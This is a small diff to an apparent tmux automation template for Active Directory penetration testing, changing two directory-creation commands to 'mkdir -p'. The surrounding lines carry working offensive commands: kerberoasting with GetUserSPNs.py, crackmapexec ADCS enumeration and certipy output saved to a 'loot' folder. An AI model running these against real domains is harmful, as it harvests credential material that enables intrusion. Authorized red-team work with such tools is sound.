@@ -65,7 +65,7 @@ windows:
       panes:
         - kerberoasting:
           - tmux select-pane -T 'kerberoasting' -t "authd:kerberoasting.0"
-          - mkdir <%= @settings["rootDir"] %>/kerberoast
+          - mkdir -p <%= @settings["rootDir"] %>/kerberoast
           - GetUserSPNs.py '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>' -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -request -outputfile <%= @settings["rootDir"] %>/kerberoast/kerberoasting.txt
         - delegation:
           - tmux select-pane -T 'delegation' -t "authd:kerberoasting.1"
@@ -97,7 +97,7 @@ windows:
           - crackmapexec ldap <%= @settings["rootDir"] %>/dcIP.txt -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M adcs
         - certipy:
           - tmux select-pane -T 'certipy' -t "authd:ADCS.1"
-          - mkdir <%= @settings["rootDir"] %>/certipy
+          - mkdir -p <%= @settings["rootDir"] %>/certipy
           - certipy find -u '<%= @settings["user"] %>@<%= @settings["domain"] %>' -p '<%= @settings["pass"] %>' -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -old-bloodhound -scheme ldap | tee <%= @settings["rootDir"] %>/loot/ADCS/certipy.txt
   - PetitPotam: 
       panes:
